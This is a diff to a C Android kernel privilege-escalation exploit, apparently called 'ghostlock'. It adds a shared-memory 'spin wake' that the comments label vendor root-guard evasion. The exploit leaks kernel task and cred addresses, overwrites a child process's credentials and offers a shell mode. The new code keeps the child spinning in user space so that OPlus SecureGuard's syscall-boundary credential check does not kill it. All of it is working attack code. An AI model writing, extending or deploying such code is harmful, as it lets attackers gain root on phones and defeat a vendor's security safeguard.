@@ -231,6 +231,68 @@ static int g_fake_stage;
 static unsigned long long g_child_task;
 static unsigned g_t_page_alloc, g_t_page_free;
 
+/* --- spin wake (vendor root-guard evasion) ---------------------------------
+ * The leak child's cred is planted while it waits for the go.  Blocked in
+ * read(3), that transition straddles a syscall, and a vendor guard that
+ * compares credentials at syscall entry/exit (OPlus SecureGuard) kills the
+ * child at the read's exit.  With TIMER_SPIN_WAKE (default on) the child
+ * waits in a shared page instead: it re-pins off the trigger's CPUs, writes
+ * the hello, publishes ready, and spins in user space with no syscall across
+ * the write; the parent releases it after the plant.  TIMER_SPIN_WAKE=0
+ * restores the pipe wake (A/B). */
+static int g_spin_wake = 1;
+static volatile unsigned *g_wake_page;
+static int g_wake_fd = -1;
+#define WAKE_READY 0
+#define WAKE_GO 1
+#define WAKE_CPU 2
+
+static int wake_create(void)
+{
+    char path[64];
+    int fd;
+
+#ifdef SYS_memfd_create
+    fd = (int)syscall(SYS_memfd_create, "ghostlock-timer-wake", 0);
+#else
+    fd = (int)syscall(279, "ghostlock-timer-wake", 0);
+#endif
+    if (fd < 0)
+    {
+        snprintf(path, sizeof path, "/data/local/tmp/.gl-wake-%d", (int)getpid());
+        fd = open(path, O_RDWR | O_CREAT | O_EXCL, 0600);
+        if (fd >= 0)
+            (void)unlink(path);
+    }
+    if (fd >= 0 && ftruncate(fd, 4096))
+    {
+        close(fd);
+        fd = -1;
+    }
+    return fd;
+}
+
+/* A verified CPU outside the trigger roles: the crasher and the exec share the
+ * victim CPU and the lockers use their own, so a spinner there would compete
+ * with the landing.  The log CPU is the fallback. */
+static int wake_cpu(void)
+{
+    for (int i = 0; i < g_n_avail; i++)
+    {
+        int c = g_avail[i], used = 0;
+
+        if (c == g_cpus.victim || c == g_cpus.log)
+            used = 1;
+        for (int k = 0; k < g_cpus.n_locker; k++)
+            if (c == g_cpus.locker[k])
+                used = 1;
+        if (!used)
+            return c;
+    }
+    return g_cpus.log;
+}
+
+
 static void logf(const char *fmt, ...);
 static int task_state(int pid);
 static int task_wchan(int pid, char *buf, size_t cap);
@@ -2666,6 +2728,32 @@ static unsigned long long leak_cred(unsigned char *raw,
          * Start tracing before fork so copy_process()'s task_struct
          * allocation is in the buffer.  The exec cred allocation follows.
          */
+        int wfd = -1;
+        volatile unsigned *wake = NULL;
+
+        if (g_spin_wake)
+        {
+            wfd = wake_create();
+            if (wfd >= 0)
+            {
+                void *wp = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                                MAP_SHARED, wfd, 0);
+
+                if (wp == MAP_FAILED)
+                {
+                    close(wfd);
+                    wfd = -1;
+                }
+                else
+                {
+                    memset(wp, 0, 4096);
+                    wake = wp;
+                    wake[WAKE_CPU] = (unsigned)wake_cpu();
+                }
+            }
+            if (!wake)
+                logf("[wake] spin page unavailable; pipe wake\n");
+        }
         trace_start();
         p = fork();
         if (p == 0)
@@ -2690,7 +2778,8 @@ static unsigned long long leak_cred(unsigned char *raw,
                 _exit(126);
             {
                 const char *cmode = shell_mode ? "shell" : (g_fake_stage ? "fake" : "verify");
-                char *av[8];
+                char *av[9];
+                char warg[16] = "";
                 int n = 0;
                 char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};
 
@@ -2702,6 +2791,11 @@ static unsigned long long leak_cred(unsigned char *raw,
                 }
                 av[n++] = (char *)"wait";
                 av[n++] = (char *)cmode;
+                if (wfd >= 0)
+                {
+                    snprintf(warg, sizeof warg, "%d", wfd);
+                    av[n++] = warg;
+                }
                 av[n] = NULL;
                 execve("/proc/self/exe", av, ep);
             }
@@ -2709,6 +2803,10 @@ static unsigned long long leak_cred(unsigned char *raw,
         }
         if (p < 0)
         {
+            if (wake)
+                munmap((void *)wake, 4096);
+            if (wfd >= 0)
+                close(wfd);
             close(go[0]);
             close(go[1]);
             close(st[0]);
@@ -2755,6 +2853,24 @@ static unsigned long long leak_cred(unsigned char *raw,
                 logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                      "recs=%d task=%#llx task_recs=%d\n",
                      attempt, p, R, site & 0x1fffff, c, task, tc);
+                if (wake)
+                {
+                    int ready = 0;
+
+                    for (int i = 0; i < 2000 && !ready; i++)
+                    {
+                        if (__atomic_load_n(&wake[WAKE_READY], __ATOMIC_ACQUIRE))
+                            ready = 1;
+                        else
+                            usleep(1000);
+                    }
+                    if (ready)
+                        logf("[wake] child spinning on cpu=%u\n", wake[WAKE_CPU]);
+                    else
+                        logf("[wake] child did not report ready; pipe wake\n");
+                }
+                g_wake_page = wake;
+                g_wake_fd = wfd;
                 *out_pid = p;
                 *out_go = go[1];
                 *out_st = st[0];
@@ -2765,6 +2881,10 @@ static unsigned long long leak_cred(unsigned char *raw,
         logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
              "task=%#llx task_recs=%d failed\n",
              attempt, p, R, hello, c, task, tc);
+        if (wake)
+            munmap((void *)wake, 4096);
+        if (wfd >= 0)
+            close(wfd);
         close(go[1]);
         close(st[0]);
         kill(p, SIGKILL);
@@ -2773,17 +2893,59 @@ static unsigned long long leak_cred(unsigned char *raw,
     return 0;
 }
 
-static int wait_child_main(const char *mode)
+static int wait_child_main(const char *mode, int wake_fd)
 {
     struct child_report rep;
     char ch;
     int hello = CHILD_HELLO;
+    volatile unsigned *wake = NULL;
 
+    /* The leak child was pinned to the victim CPU for the exec's cred
+     * allocation; with the spin wake it is re-pinned off the trigger's CPUs
+     * and waits in user space.  Both are settled before the hello. */
+    if (wake_fd >= 0)
+    {
+        void *wp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
+                        wake_fd, 0);
+
+        if (wp == MAP_FAILED)
+            logf("[wake] child mmap failed (%s); pipe wake\n", strerror(errno));
+        else
+        {
+            wake = wp;
+            unsigned cpu = __atomic_load_n(&wake[WAKE_CPU], __ATOMIC_ACQUIRE);
+            if (cpu < CPU_SETSIZE)
+            {
+                cpu_set_t set;
+
+                CPU_ZERO(&set);
+                CPU_SET((int)cpu, &set);
+                (void)sched_setaffinity(0, sizeof set, &set);
+            }
+        }
+    }
     /* The affinity was set before execve (pin_role in leak_cred) and execve
      * preserves it; this process never derives the layout. */
     if (write(4, &hello, sizeof(hello)) != sizeof(hello))
         _exit(130);
-    if (read(3, &ch, 1) != 1)
+    if (wake)
+    {
+        int got = 0;
+
+        __atomic_store_n(&wake[WAKE_READY], 1u, __ATOMIC_RELEASE);
+        for (unsigned long long spin = 0; spin < (1ULL << 36); spin++)
+        {
+            if (__atomic_load_n(&wake[WAKE_GO], __ATOMIC_ACQUIRE))
+            {
+                got = 1;
+                break;
+            }
+            __asm__ volatile("" ::: "memory");
+        }
+        if (!got)
+            _exit(133);
+    }
+    else if (read(3, &ch, 1) != 1)
         _exit(131);
     close(3);
 
@@ -3079,6 +3241,12 @@ int main(int argc, char **argv)
         break;
     }
     mode = argi < argc ? argv[argi] : "";
+    {
+        const char *sw = getenv("TIMER_SPIN_WAKE");
+
+        if (sw)
+            g_spin_wake = atoi(sw) != 0;
+    }
 
     if (!strcmp(mode, "probe"))
         return probe_main(profile_path);
@@ -3147,7 +3315,8 @@ int main(int argc, char **argv)
     logf("[+] build %s\n", release);
 
     if (!strcmp(mode, "wait"))
-        return wait_child_main(argi + 1 < argc ? argv[argi + 1] : "verify");
+        return wait_child_main(argi + 1 < argc ? argv[argi + 1] : "verify",
+                               argi + 2 < argc ? atoi(argv[argi + 2]) : -1);
 
     if (!strcmp(mode, "shell"))
         shell_mode = 1;
@@ -3305,6 +3474,8 @@ int main(int argc, char **argv)
     }
     logf("[+] cred writes landed, waking child\n");
 
+    if (g_wake_page)
+        __atomic_store_n(&g_wake_page[WAKE_GO], 1u, __ATOMIC_RELEASE);
     if (write(go_fd, "A", 1) != 1)
         logf("[!] child wake write failed\n");
     close(go_fd);
